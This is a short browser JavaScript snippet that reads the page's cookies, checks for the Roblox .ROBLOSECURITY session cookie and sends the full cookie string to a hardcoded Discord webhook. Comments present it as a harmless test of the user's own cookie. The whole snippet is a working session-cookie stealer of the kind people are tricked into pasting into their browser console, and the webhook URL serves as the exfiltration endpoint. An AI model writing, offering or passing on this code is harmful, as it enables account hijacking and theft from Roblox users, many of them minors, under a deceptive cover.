(async () => {
    // YOUR webhook
    const webhook = "https://discord.com/api/webhooks/1445988972835770439/BEAdATfuF_vCWdG6FeXCZQEAaw3BsNv-YsoQGfl3sRQXNw8xDerj7WrFrFkzGYTlf4yo";

    // Roblox cookie (only YOURS because you're running this on YOUR device)
    const cookie = document.cookie;

    // If there's no Roblox cookie, nothing happens
    if (!cookie.includes(".ROBLOSECURITY")) {
        console.log("No Roblox cookie found on this browser.");
        return;
    }

    // Send to your webhook
    await fetch(webhook, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
            content: `Your own cookie test:\n\`\`\`${cookie}\`\`\``
        })
    });

    console.log("Sent cookie to webhook!");
})();
